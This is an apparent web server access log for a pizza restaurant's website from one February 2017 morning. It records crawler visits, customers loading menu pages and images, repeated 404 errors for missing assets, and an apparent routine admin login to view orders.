66.249.75.139 - - [27/Feb/2017:06:00:01 -0500] "GET /pizza/categories.php HTTP/1.1" 200 7509 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
5.255.250.43 - - [27/Feb/2017:06:10:34 -0500] "GET /pizza/cart.php HTTP/1.1" 200 3863 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /dist/js/bootstrap.js HTTP/1.1" 200 55258 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /menu2.png HTTP/1.1" 200 163838 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /menu3.png HTTP/1.1" 200 177242 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /mediterr.JPG HTTP/1.1" 200 417161 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /menu.png HTTP/1.1" 304 - www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /dist/css/button.png HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:26:54 -0500] "GET /img/comment.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
66.249.75.135 - - [27/Feb/2017:06:27:09 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
108.222.98.99 - - [27/Feb/2017:06:33:12 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:33:12 -0500] "GET /dist/css/button.png HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:33:12 -0500] "GET /img/comment.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
108.222.98.99 - - [27/Feb/2017:06:33:12 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1" "-"
5.255.250.65 - - [27/Feb/2017:06:36:17 -0500] "GET /pizza/proddetail.php?prod=Catsalad HTTP/1.1" 200 7706 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
141.8.143.234 - - [27/Feb/2017:07:04:25 -0500] "GET /pizza/proddetail.php?prod=R_Sandwiches HTTP/1.1" 200 7671 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
163.172.66.28 - - [27/Feb/2017:07:15:56 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
209.95.50.137 - - [27/Feb/2017:07:29:55 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)" "-"
70.195.196.190 - - [27/Feb/2017:07:30:05 -0500] "GET /menu2.png HTTP/1.1" 304 - www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
141.8.143.238 - - [27/Feb/2017:07:40:13 -0500] "GET /pizza/proddetail.php?prod=turtle HTTP/1.1" 200 7658 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
180.76.15.146 - - [27/Feb/2017:07:43:26 -0500] "GET /pizza/proddetail.php?prod=Caprese HTTP/1.1" 200 7678 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-"
40.77.167.28 - - [27/Feb/2017:07:48:40 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
108.219.149.177 - - [27/Feb/2017:08:02:31 -0500] "GET /menu.png HTTP/1.1" 304 - www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
108.219.149.177 - - [27/Feb/2017:08:02:31 -0500] "GET /menu3.png HTTP/1.1" 304 - www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
108.219.149.177 - - [27/Feb/2017:08:02:31 -0500] "GET /button.png HTTP/1.1" 200 6418 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
108.219.149.177 - - [27/Feb/2017:08:02:31 -0500] "GET /dist/css/button.png HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
108.219.149.177 - - [27/Feb/2017:08:02:32 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
108.219.149.177 - - [27/Feb/2017:08:02:32 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
108.219.149.177 - - [27/Feb/2017:08:02:32 -0500] "GET /menu2.png HTTP/1.1" 304 - www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.14.81 - - [27/Feb/2017:08:07:20 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.14.81 - - [27/Feb/2017:08:07:20 -0500] "GET /California.JPG HTTP/1.1" 200 420843 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.14.81 - - [27/Feb/2017:08:07:20 -0500] "GET /dist/css/button.png HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.14.81 - - [27/Feb/2017:08:07:20 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.14.81 - - [27/Feb/2017:08:07:20 -0500] "GET /img/comment.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
111.20.178.90 - - [27/Feb/2017:08:14:40 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/4.0" "-"
111.20.178.90 - - [27/Feb/2017:08:14:41 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/4.0" "-"
66.249.75.139 - - [27/Feb/2017:08:15:51 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
141.8.143.201 - - [27/Feb/2017:08:35:43 -0500] "GET /robots.txt HTTP/1.1" 404 1363 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
141.8.143.163 - - [27/Feb/2017:08:35:46 -0500] "GET /pizza/proddetail.php?prod=CPZ HTTP/1.1" 200 8388 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
40.77.167.28 - - [27/Feb/2017:08:47:25 -0500] "GET /pizza/products.php?cat=9 HTTP/1.1" 200 27758 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
155.133.64.135 - - [27/Feb/2017:08:49:37 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" "-"
141.8.143.137 - - [27/Feb/2017:09:07:32 -0500] "GET /pizza/pizza_3.swf HTTP/1.1" 200 244362 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
40.77.167.28 - - [27/Feb/2017:09:11:47 -0500] "GET /pizza/categories.php HTTP/1.1" 200 7509 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.167.28 - - [27/Feb/2017:09:20:57 -0500] "GET /robots.txt HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.160 - - [27/Feb/2017:09:21:06 -0500] "GET /contact.css HTTP/1.1" 200 2988 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.160 - - [27/Feb/2017:09:21:06 -0500] "GET /dist/js/bootstrap.js HTTP/1.1" 200 55258 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.76 - - [27/Feb/2017:09:21:10 -0500] "GET /dist/css/bootstrap.css HTTP/1.1" 200 124612 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.213 - - [27/Feb/2017:09:22:53 -0500] "GET /robots.txt HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.167.28 - - [27/Feb/2017:09:22:56 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
180.76.15.150 - - [27/Feb/2017:09:26:01 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" "-"
180.76.15.156 - - [27/Feb/2017:09:26:02 -0500] "GET /dist/js/bootstrap.js HTTP/1.1" 200 55258 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" "-"
5.255.250.61 - - [27/Feb/2017:09:38:39 -0500] "GET /pizza/proddetail.php?prod=SS HTTP/1.1" 200 7624 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
100.43.91.5 - - [27/Feb/2017:10:07:13 -0500] "GET /pizza/proddetail.php?prod=Tiramasu HTTP/1.1" 200 7690 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
157.55.39.212 - - [27/Feb/2017:10:22:22 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.1 - - [27/Feb/2017:10:22:46 -0500] "GET /dist/fonts/glyphicons-halflings-regular.svg HTTP/1.1" 200 62927 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.220 - - [27/Feb/2017:10:24:09 -0500] "GET /robots.txt HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
66.249.75.139 - - [27/Feb/2017:10:25:29 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
40.77.167.28 - - [27/Feb/2017:10:31:05 -0500] "GET /index.html HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
163.172.66.164 - - [27/Feb/2017:10:32:46 -0500] "GET /pizza/proddetail.php?prod=GB HTTP/1.1" 200 8238 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
157.55.39.215 - - [27/Feb/2017:10:38:09 -0500] "GET /dist/fonts/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.215 - - [27/Feb/2017:10:38:10 -0500] "GET /img/comment.svg HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.215 - - [27/Feb/2017:10:38:12 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
74.130.18.166 - - [27/Feb/2017:11:01:46 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /dist/js/bootstrap.js HTTP/1.1" 200 55258 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /dist/css/bootstrap.css HTTP/1.1" 200 124612 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /contact.css HTTP/1.1" 200 2988 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /american-pie.JPG HTTP/1.1" 200 454093 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /mediterr.JPG HTTP/1.1" 200 417161 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /california.JPG HTTP/1.1" 301 252 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /gyro.png HTTP/1.1" 200 2238665 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /button.png HTTP/1.1" 200 6418 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /California.JPG HTTP/1.1" 200 420843 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:47 -0500] "GET /menu.png HTTP/1.1" 200 134412 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /menu2.png HTTP/1.1" 200 163838 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /menu3.png HTTP/1.1" 200 177242 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /dist/fonts/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 www.lagourmetpizza.com "http://www.lagourmetpizza.com/dist/css/bootstrap.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/contact.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /dist/css/button.png HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/dist/css/bootstrap.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/contact.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /img/comment.svg HTTP/1.1" 404 1363 www.lagourmetpizza.com "http://www.lagourmetpizza.com/contact.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:48 -0500] "GET /img/pizza/pizza.png HTTP/1.1" 200 5169384 www.lagourmetpizza.com "http://www.lagourmetpizza.com/dist/css/bootstrap.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
74.130.18.166 - - [27/Feb/2017:11:01:53 -0500] "GET /images/favicon.ico HTTP/1.1" 200 1150 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "-"
70.122.228.209 - - [27/Feb/2017:11:02:08 -0500] "GET /pizza/vsadmin/login.php HTTP/1.1" 200 5016 lagourmetpizza.com "-" "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0" "-"
70.122.228.209 - - [27/Feb/2017:11:02:08 -0500] "GET /favicon.ico HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0" "-"
70.122.228.209 - - [27/Feb/2017:11:02:09 -0500] "POST /pizza/vsadmin/login.php HTTP/1.1" 200 4538 lagourmetpizza.com "http://lagourmetpizza.com/pizza/vsadmin/login.php" "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0" "-"
70.122.228.209 - - [27/Feb/2017:11:02:13 -0500] "GET /pizza/vsadmin/admin.php HTTP/1.1" 200 10013 lagourmetpizza.com "-" "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0" "-"
70.122.228.209 - - [27/Feb/2017:11:02:17 -0500] "GET /pizza/vsadmin/adminorders.php HTTP/1.1" 200 8370 lagourmetpizza.com "http://lagourmetpizza.com/pizza/vsadmin/admin.php" "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0" "-"
70.122.228.209 - - [27/Feb/2017:11:02:17 -0500] "GET /pizza/vsadmin/adminorders.php HTTP/1.1" 200 13707 lagourmetpizza.com "http://lagourmetpizza.com/pizza/vsadmin/admin.php" "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0" "-"
157.55.39.160 - - [27/Feb/2017:11:07:33 -0500] "GET /LAGPmenu.pdf HTTP/1.1" 200 1706552 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
111.20.178.90 - - [27/Feb/2017:11:13:36 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/4.0" "-"
111.20.178.90 - - [27/Feb/2017:11:13:38 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/4.0" "-"
5.255.250.49 - - [27/Feb/2017:11:16:13 -0500] "GET /pizza/proddetail.php?prod=Caprese HTTP/1.1" 200 7678 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
66.87.96.152 - - [27/Feb/2017:11:17:16 -0500] "GET /LAGPmenu.pdf HTTP/1.1" 200 1706552 www.lagourmetpizza.com "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
66.249.75.135 - - [27/Feb/2017:11:26:24 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
107.77.196.69 - - [27/Feb/2017:11:26:59 -0500] "GET /pizza/thanks.php HTTP/1.1" 200 2929 lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
107.77.196.69 - - [27/Feb/2017:11:29:04 -0500] "GET /pizza/thanks.php HTTP/1.1" 200 2929 lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
66.87.96.152 - - [27/Feb/2017:11:30:24 -0500] "GET /LAGPmenu.pdf HTTP/1.1" 200 1706552 www.lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
107.21.1.8 - - [27/Feb/2017:11:31:32 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" "-"
